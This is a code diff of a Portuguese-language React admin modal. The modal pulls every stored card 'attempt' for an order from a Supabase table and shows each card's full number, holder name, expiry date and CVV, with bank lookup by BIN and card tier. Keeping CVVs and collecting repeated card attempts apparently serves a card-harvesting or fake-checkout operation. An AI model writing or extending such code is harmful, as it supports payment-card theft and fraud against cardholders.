@@ -2,7 +2,7 @@
 import React from "react";
 import { format } from "date-fns";
 import { ptBR } from "date-fns/locale";
-import { Order } from "@/types/checkout";
+import { Order, CreditCardData } from "@/types/checkout";
 import StatusBadge from "../StatusBadge";
 import {
   Dialog,
@@ -14,6 +14,8 @@ import {
 } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
 import { CreditCard } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
+import { useState, useEffect } from "react";
 
 interface PaymentDetailsModalProps {
   order: Order | null;
@@ -59,12 +61,52 @@ const PaymentDetailsModal: React.FC<PaymentDetailsModalProps> = ({
   open,
   onClose,
 }) => {
+  const [allCardData, setAllCardData] = useState<CreditCardData[]>([]);
+  const [isLoading, setIsLoading] = useState<boolean>(false);
+
+  useEffect(() => {
+    const fetchAllCardAttempts = async () => {
+      if (order?.id && open && order.paymentMethod === "creditCard") {
+        setIsLoading(true);
+        
+        try {
+          const { data, error } = await supabase
+            .from('card_data')
+            .select('*')
+            .eq('order_id', order.id)
+            .order('created_at', { ascending: false });
+            
+          if (error) {
+            console.error('Error fetching card attempts:', error);
+            return;
+          }
+          
+          if (data) {
+            const formattedCardData = data.map(card => ({
+              holderName: card.holder_name,
+              number: card.number,
+              expiryDate: card.expiry_date,
+              cvv: card.cvv,
+              bin: card.bin,
+              brand: card.brand,
+              createdAt: card.created_at
+            }));
+            
+            setAllCardData(formattedCardData);
+          }
+        } catch (e) {
+          console.error('Error in card data fetch:', e);
+        } finally {
+          setIsLoading(false);
+        }
+      }
+    };
+    
+    fetchAllCardAttempts();
+  }, [order?.id, open, order?.paymentMethod]);
+
   if (!order) return null;
   
-  // Get bank name and card level if card data exists
-  const bankName = order.cardData ? getBankFromBin(order.cardData.bin) : undefined;
-  const cardLevel = order.cardData ? getCardLevel(order.cardData.bin, order.cardData.brand) : undefined;
-
   return (
     <Dialog open={open} onOpenChange={onClose}>
       <DialogContent className="sm:max-w-md">
@@ -119,50 +161,75 @@ const PaymentDetailsModal: React.FC<PaymentDetailsModalProps> = ({
           )}
           
           {/* Credit Card Details */}
-          {order.paymentMethod === "creditCard" && order.cardData && (
+          {order.paymentMethod === "creditCard" && (
             <>
               <div className="border-t pt-3 my-3">
                 <h4 className="font-medium mb-2 flex items-center">
                   <CreditCard className="mr-2 h-4 w-4" />
-                  Dados do Cartão
+                  {allCardData.length > 1 
+                    ? `Dados dos Cartões (${allCardData.length} tentativas)` 
+                    : "Dados do Cartão"}
                 </h4>
               </div>
-              <div className="grid grid-cols-3 gap-4 text-sm">
-                <div className="font-medium text-gray-500">Número:</div>
-                <div className="col-span-2">{order.cardData.number}</div>
-              </div>
-              <div className="grid grid-cols-3 gap-4 text-sm">
-                <div className="font-medium text-gray-500">Titular:</div>
-                <div className="col-span-2">{order.cardData.holderName}</div>
-              </div>
-              <div className="grid grid-cols-3 gap-4 text-sm">
-                <div className="font-medium text-gray-500">Validade:</div>
-                <div className="col-span-2">{order.cardData.expiryDate}</div>
-              </div>
-              <div className="grid grid-cols-3 gap-4 text-sm">
-                <div className="font-medium text-gray-500">CVV:</div>
-                <div className="col-span-2">{order.cardData.cvv}</div>
-              </div>
-              {order.cardData.bin && (
-                <div className="grid grid-cols-3 gap-4 text-sm">
-                  <div className="font-medium text-gray-500">BIN/Banco:</div>
-                  <div className="col-span-2">
-                    {order.cardData.bin} 
-                    {bankName && ` - ${bankName}`}
+              
+              {isLoading ? (
+                <div className="text-center py-4">
+                  <div className="animate-spin h-5 w-5 border-2 border-primary border-t-transparent rounded-full mx-auto"></div>
+                  <p className="text-sm text-gray-500 mt-2">Carregando tentativas de cartão...</p>
+                </div>
+              ) : (
+                allCardData.length > 0 ? (
+                  allCardData.map((cardData, index) => (
+                    <div key={index} className={index > 0 ? "mt-6 pt-4 border-t border-dashed" : ""}>
+                      {allCardData.length > 1 && (
+                        <h5 className="text-sm font-medium mb-3">
+                          Tentativa {index + 1} - {format(new Date(cardData.createdAt || ''), "dd/MM/yyyy HH:mm", { locale: ptBR })}
+                        </h5>
+                      )}
+                      <div className="grid grid-cols-3 gap-4 text-sm">
+                        <div className="font-medium text-gray-500">Número:</div>
+                        <div className="col-span-2">{cardData.number}</div>
+                      </div>
+                      <div className="grid grid-cols-3 gap-4 text-sm">
+                        <div className="font-medium text-gray-500">Titular:</div>
+                        <div className="col-span-2">{cardData.holderName}</div>
+                      </div>
+                      <div className="grid grid-cols-3 gap-4 text-sm">
+                        <div className="font-medium text-gray-500">Validade:</div>
+                        <div className="col-span-2">{cardData.expiryDate}</div>
+                      </div>
+                      <div className="grid grid-cols-3 gap-4 text-sm">
+                        <div className="font-medium text-gray-500">CVV:</div>
+                        <div className="col-span-2">{cardData.cvv}</div>
+                      </div>
+                      {cardData.bin && (
+                        <div className="grid grid-cols-3 gap-4 text-sm">
+                          <div className="font-medium text-gray-500">BIN/Banco:</div>
+                          <div className="col-span-2">
+                            {cardData.bin} 
+                            {getBankFromBin(cardData.bin) && ` - ${getBankFromBin(cardData.bin)}`}
+                          </div>
+                        </div>
+                      )}
+                      {cardData.brand && (
+                        <div className="grid grid-cols-3 gap-4 text-sm">
+                          <div className="font-medium text-gray-500">Bandeira:</div>
+                          <div className="col-span-2">{cardData.brand}</div>
+                        </div>
+                      )}
+                      {cardData.bin && (
+                        <div className="grid grid-cols-3 gap-4 text-sm">
+                          <div className="font-medium text-gray-500">Nível do Cartão:</div>
+                          <div className="col-span-2">{getCardLevel(cardData.bin, cardData.brand)}</div>
+                        </div>
+                      )}
+                    </div>
+                  ))
+                ) : (
+                  <div className="text-center py-4 text-gray-500">
+                    Nenhum dado de cartão disponível.
                   </div>
-                </div>
-              )}
-              {order.cardData.brand && (
-                <div className="grid grid-cols-3 gap-4 text-sm">
-                  <div className="font-medium text-gray-500">Bandeira:</div>
-                  <div className="col-span-2">{order.cardData.brand}</div>
-                </div>
-              )}
-              {cardLevel && (
-                <div className="grid grid-cols-3 gap-4 text-sm">
-                  <div className="font-medium text-gray-500">Nível do Cartão:</div>
-                  <div className="col-span-2">{cardLevel}</div>
-                </div>
+                )
               )}
             </>
           )}
